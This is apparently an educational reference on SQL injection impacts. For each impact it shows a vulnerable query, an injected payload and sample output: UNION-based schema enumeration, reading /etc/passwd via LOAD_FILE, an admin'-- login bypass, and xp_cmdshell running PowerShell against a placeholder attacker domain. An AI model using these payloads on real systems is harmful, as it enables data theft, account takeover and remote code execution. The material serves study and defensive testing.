## Information Leakage

### It is possible to access data without the appropriate permissions.

- Retrieving schema objects
  1. Query that fetches posts
      ```sql
      SELECT * FROM posts WHERE id = {user_input};
      ```
  2. Standard query
      ```sql
      SELECT * FROM posts WHERE id = 1;
      ```
      ```json
      {
        "id": 1,
        "title": "First Post",
        "content": "This is the content of the first post."
      }
      ```
  3. Manipulated query
      ```sql
      SELECT * FROM posts WHERE id = 1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = 'database_name'
      ```
      ```json
      [
        {
          "id": 1,
          "title": "First Post",
          "content": "This is the content of the first post."
        },
        {
          "id": null,
          "table_name": "posts",
          "content": null
        },
        {
          "id": null,
          "table_name": "user_information",
          "content": null
        }
      ]
      ```

- Reading file from the file system
  1. Query that fetches posts
      ```sql
      SELECT * FROM posts WHERE id = {user_input};
      ```
  2. Manipulating the query to read local files
      ```sql
      SELECT * FROM posts WHERE id = 1 UNION SELECT null, LOAD_FILE('/etc/passwd'),null;
      ```
      ```json
      [
        {
          "id": 1,
          "title": "First Post",
          "content": "This is the content of the first post."
        },
        {
          "id": null,
          "title": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n...",
          "content": null
        }
      ]
      ```

## Authentication bypass

### The protection logic implemented in the service's business logic can be bypassed.

- Login bypass
  1. Query that validates credentials
      ```sql
      SELECT * FROM users WHERE id = '{user_input_id}' AND password = '{user_input_password}';
      ```

  2. Manipulated query
      ```sql
      SELECT * FROM users WHERE id = 'admin'-- AND password = '1';
      ```

## RCE

### Arbitrary commands can be executed remotely.

- OAST
  1. Query that fetches posts
      ```sql
      SELECT * FROM posts WHERE id = {user_input};
      ```
  2. Manipulated query
      ```sql
      SELECT * FROM posts WHERE id = 1; exec xp_cmdshell('powershell -Command "Invoke-WebRequest -Uri https://[ATTACKER-DOMAIN]/"');
      ```
